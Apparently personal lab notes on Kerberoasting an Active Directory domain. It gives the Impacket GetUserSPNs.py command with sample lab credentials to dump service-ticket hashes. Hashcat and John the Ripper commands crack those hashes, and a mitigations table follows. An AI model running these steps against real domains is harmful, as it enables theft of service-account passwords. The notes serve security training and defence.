## Tool: Impacket `GetUserSPNs.py`

### Location on Kali


## Step 1 — Dump All Service Tickets

### Command Syntax

```bash
python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py <domain>.local/<username>:<password> -dc-ip <DC IP> -request
```

### Example

```bash
python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py bittu_tech.local/ansh_b:Password123 -dc-ip 192.168.75.16 -request
```

| Argument | Value | Purpose |
|---|---|---|
| `bittu_tech.local/ansh_b:Password123` | Domain / user : password | Authenticate as a valid domain user |
| `-dc-ip 192.168.75.16` | Domain Controller IP | Target DC for LDAP + Kerberos queries |
| `-request` | Flag | Request and dump TGS tickets for all identified SPNs |

### Output

The tool detects SPNs (e.g., MSSQL Service) and dumps the encrypted Kerberos 5 TGS ticket hash (`$krb5tgs$23$*...`).

![](attachments/Pasted%20image%2020261004214643.png)

> [!WARNING]
> **Clock Skew Error**: If you get Kerberos time synchronisation errors, ensure your Kali machine's system clock matches the Domain Controller's time.

## Step 2 — Save the Hash

Copy the **entire** raw ticket hash string from terminal output and save it to a file:

```bash
nano hash.txt
# Paste the complete $krb5tgs$23$*... hash string
```

---

## Step 3 — Crack the Hash

### With Hashcat (Mode 13100 — Kerberos 5 TGS-REP)

```bash
# Find the correct mode
hashcat --help | grep -i kerberos

# Crack using rockyou wordlist
hashcat -m 13100 hash.txt rockyou.txt --force

# View cracked password
hashcat -m 13100 hash.txt rockyou.txt --show
```

> [!TIP]
> **"No hashes loaded" error**: Ensure the raw hash was pasted without truncated lines or missing the header prefix (`$krb5tgs$23$*...`).

### With John the Ripper

```bash
# Crack
john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show recovered password
john --show --format=krb5tgs hash.txt
```

## Mitigations

| Mitigation | Detail |
|---|---|
| **Enable AES encryption** | Replace RC4 (`RC4_HMAC_MD5`) with AES-128/AES-256 for service accounts — massively increases cracking difficulty |
| **Strong passwords (25+ chars)** | 11–16 character passwords crack in seconds with GPU. Enforce **25+ characters**. Consider **gMSA** (auto-rotated 128-char passwords) |
| **Principle of least privilege** | Never assign Domain Admin or Local Admin to service accounts. A cracked ticket with minimal rights = minimal damage |
